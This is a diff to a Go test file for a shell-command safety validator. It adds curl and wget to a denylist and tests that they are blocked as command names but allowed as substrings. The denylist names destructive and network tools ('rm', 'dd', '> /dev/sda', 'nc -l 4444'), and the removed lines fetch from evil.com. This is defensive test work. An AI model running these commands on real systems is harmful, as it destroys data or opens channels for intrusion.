@@ -213,7 +213,7 @@ func TestRunShellCommandTool_Denylist_DangerousCommands(t *testing.T) {
 	dangerousCommands := []string{
 		"rm", "dd", "mkfs", "fdisk", "killall", "pkill",
 		"reboot", "shutdown", "iptables", "mount", "umount",
-		"passwd", "sudo", "su",
+		"passwd", "sudo", "su", "curl", "wget",
 	}
 
 	for _, cmd := range dangerousCommands {
@@ -230,8 +230,6 @@ func TestRunShellCommandTool_Denylist_DangerousPatterns(t *testing.T) {
 		"mkfs.ext4",
 		"> /dev/sda",
 		"chmod 777 /",
-		"wget http://evil.com",
-		"curl http://evil.com",
 		"nc -l 4444",
 	}
 
@@ -257,6 +255,33 @@ func TestRunShellCommandTool_Denylist_ShellInjection(t *testing.T) {
 			err := validateCommandSafety(pattern, nil, "")
 			require.Error(t, err)
 			require.Contains(t, strings.ToLower(err.Error()), "shell injection")
+		})
+	}
+}
+
+func TestRunShellCommandTool_Denylist_CurlWgetAsCommandNameBlocked(t *testing.T) {
+	for _, cmd := range []string{"curl", "wget"} {
+		t.Run(cmd, func(t *testing.T) {
+			err := validateCommandSafety(cmd, []string{"http://example.com"}, "")
+			require.Error(t, err)
+			require.Contains(t, strings.ToLower(err.Error()), "blocked by safety policy")
+		})
+	}
+}
+
+func TestRunShellCommandTool_Denylist_CurlWgetAsSubstringAllowed(t *testing.T) {
+	for _, tc := range []struct {
+		command string
+		args    []string
+	}{
+		{"slew", []string{"10.43.0.40:9000", "45.0", "30.0"}},
+		{"echo", []string{"use curl to download"}},
+		{"grep", []string{"curl", "file.txt"}},
+		{"cat", []string{"wget-log.txt"}},
+	} {
+		t.Run(tc.command, func(t *testing.T) {
+			err := validateCommandSafety(tc.command, tc.args, "")
+			require.NoError(t, err)
 		})
 	}
 }
